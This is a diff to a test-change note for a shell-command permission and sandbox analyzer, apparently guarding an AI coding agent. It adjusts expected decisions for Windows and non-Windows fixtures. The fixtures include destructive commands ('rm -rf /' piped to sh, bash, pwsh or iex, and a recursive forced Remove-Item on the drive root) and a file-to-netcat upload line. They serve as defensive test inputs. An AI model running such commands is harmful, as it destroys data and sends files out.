@@ -1239,3 +1239,48 @@ These fourteen unchanged inputs use A: real executable-input or literal-data exe
 Implementation is test-only: add one exact literal command to the existing credential admission oracle and its generated PowerShell call-operator variant, plus the exact Bash base-command case. Change two existing semantic disposition rows from ordinary to credential-store with the explicit admission basis. Original 2,031 input strings, all historical buckets and all hashes remain unchanged. No assertion about unsupported-wrapper reusable proof changes.
 
 The unrelated package-json and hashtable failures were false shared-budget exhaustion from unquoted head self-recursion and remain source fixes; their ordinary assertions are unchanged.
+
+### Static literal-upload consumer
+
+`shell-static-analysis.test.ts` retains the original `npx --unknown 'cat file | nc host 80'` command. Its evidence expectation changes `unproven` → `visible-floor` plus a required exfiltration string under F: a literal file-read/network-sink pipeline is inspected independently of the unknown receiver. The existing absence of `exactLiteralEvaluation` remains asserted. All subsequent wrapper work-count and scaling assertions remain unchanged and must execute.
+
+`rule-analysis-reuse.test.ts` keeps `echo 'literal text' plain`, the proven result, exact semantic/raw views and cached object identity. It now separately asserts the exact original three parent raw-word calls. After literal proof and repeated rule analysis, it requires those same three calls exactly once plus the two newly inspected child words, `literal` and `text`, exactly once. The former total-three assertion counted only the parent grammar; the new exact call set proves both mandatory literal-body inspection and absence of duplicate parent-rule work. No timing or parser budget changes.
+
+### Windows literal/proof cells
+
+## encoded-bypass-battery — four fixtures / 32 Windows lane cells
+
+All four original literal strings contain unchanged `DESTRUCTIVE_SCRIPT = "rm -rf /"`:
+1. Bash: `printf %s 'rm -rf /' | sh`
+2. Bash: `printf %s 'rm -rf /' | bash`
+3. PowerShell: `Write-Output 'rm -rf /' | pwsh -`
+4. PowerShell: `Write-Output 'rm -rf /' | iex`
+
+Each fixture now gets `permissionFloor:"protected-path"` only when process.platform is win32. The existing shared lane helper therefore checks every saved=false/true × sandboxed=false/true × headless=false/true combination exactly:
+
+- Windows foreground: old allow → ask, forceModal:true, reasonCode protected-path.
+- Windows headless: old allow → deny, reasonCode no-approver.
+- Non-Windows: original mode-handled allowance remains unchanged, with no fabricated critical-delete claim for printed literal data.
+
+Basis: the every-literal-body protected-write screen retains Windows possibly-protected-root evidence even when supplied as printed data. It is not a reusable rule or execution proof. The direct Windows bare `rm -rf /` control in powershell-network-rules already requires this same protected-path reason. Original signal outcome UNPROVEN and exact/session/persistent eligibility assertions are retained, as are all saved-rule and lane iterations. Base64 fixtures are unchanged.
+
+## powershell-network-rules — three exact cases
+
+1. `uses the literal prefix grant for host and sandboxed calls`: fresh-install 기본 (`strict`) mode, command `Get-ChildItem src`, stored prefix `PowerShell(Get-ChildItem *)`.
+   - Windows sandboxed=true: old ask/shell-approval → allow/read-only-shell, per S, the safe-read cmdlet row.
+   - Windows host/sandbox-off still asks with the original EXACT_ALLOW startup-proof refusal; no prefix authority is manufactured.
+   - Non-Windows both original exact-rule allowance assertions remain unchanged.
+2. `uses visible floors and sandbox authority (powershell)`, literal child `pwsh -Command "rm -rf /"`.
+3. Same literal child under the Bash outer dialect.
+   - Both still require the forced card; only Windows reason changes critical-delete → exact protected-path, consistent with the already-present bare Windows root-spelling control. Non-Windows still requires critical-delete.
+   - Headless still requires deny/no-approver. Actual proven critical-delete probes (`Remove-Item -LiteralPath / -Recurse -Force` or Bash using the actual drive-root path) still require critical-delete unchanged. Encoded-script ordinary approval and exact-rule rejection controls remain untouched.
+
+## shell-sandbox-rules — two exact read-only evidence cases
+
+Global Allow writes (`default`), sandboxed=true:
+1. `Get-ChildItem -Recurse src`
+2. `Get-ChildItem src -Depth 2`
+
+The permission outcome assertion already required allow/read-only-shell and remains unchanged. The stale Windows metadata pin `unproven:true` becomes `unproven:false`; both now explicitly require readOnlyProven:true as well as unchanged sandboxed:true and destructive:false. This follows the newly supported known-safe read-only cmdlet proof rather than external interpreter startup authority.
+
+The neighboring `Copy-Item src out -Recurse` keeps exactly its prior platform-dependent decision and unproven value (Windows ordinary approval/unproven; non-Windows sandbox-auto/proven). It additionally pins readOnlyProven:false. Every traversal predicate, no-force/no-floor assertion, and later Allow-mode result remains unchanged.
